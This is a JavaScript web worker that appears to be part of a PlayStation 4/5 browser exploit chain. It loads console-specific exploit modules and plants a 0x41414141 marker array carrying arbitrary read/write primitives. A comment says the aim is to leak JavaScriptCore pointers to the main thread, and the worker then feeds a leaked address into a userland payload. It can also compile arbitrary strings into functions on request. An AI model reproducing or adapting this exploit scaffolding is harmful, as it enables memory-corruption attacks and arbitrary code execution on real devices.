let marker_arr = new Uint32Array(new ArrayBuffer(0x10));

const transfer = [];
const logger = {
  verbose: true, // enable for debug logs

  info(msg) {
    this.log('[+]', `${msg}`);
  },
  error(msg) {
    this.log('[-]', `${msg}`);
  },
  debug(msg) {
    if (this.verbose) this.log('[*]', `${msg}`);
  },
  log(prefix, msg) {
    self.postMessage({ type: 'log', value: { prefix, msg } });
  },
};

const api = {
  init() {
    importScripts('misc.js');

    version.init();

    switch (version.console) {
      case 4:
        importScripts('ps4/impl.js');
        break;
      case 5:
        importScripts('ps5/impl.js');
        break;
      default:
        throw new Error(`Unsupported console ${version.console}`);
    }

    importScripts('userland.js');

    // leaks worker JSC pointers into main thread
    marker_arr.fill(0x41414141); // easier to find in memory
    marker_arr.leak = arw.leak;
    marker_arr.master = arw.master;
    marker_arr.victim = arw.victim;

    transfer.push(marker_arr.buffer);

    return marker_arr;
  },
  setup(leak_addr) {
    transfer.length = 0;

    leak_addr = new BInt(leak_addr);

    if (leak_addr.eq(0)) {
      throw new Error('Empty addr !!');
    }

    arw.leak_addr = leak_addr;

    userland_main();

    marker_arr = null;

    return true;
  },
  register(name, fn) {
    if (typeof fn !== 'string') {
      throw new Error(`${fn} not a string !!`);
    }

    if (name in api) {
      throw new Error(`${name} already registered !!`);
    }

    logger.debug(`registering function ${name} !!`);

    api[name] = new Function(`return (${fn})`)();

    return true;
  },
};

let queue = Promise.resolve();

self.onmessage = (e) => {
  const { id, name, args = [] } = e.data || {};

  queue = queue.then(async () => {
    try {
      const fn = api[name];

      if (typeof fn !== 'function') {
        throw new Error(`Unknown function ${name} !!`);
      }

      const ret = await fn(...args);

      self.postMessage({ id, type: 'ret', value: ret }, transfer);
    } catch (err) {
      self.postMessage({ id, type: 'err', value: { message: err.message, stack: err.stack } });
    }
  });
};
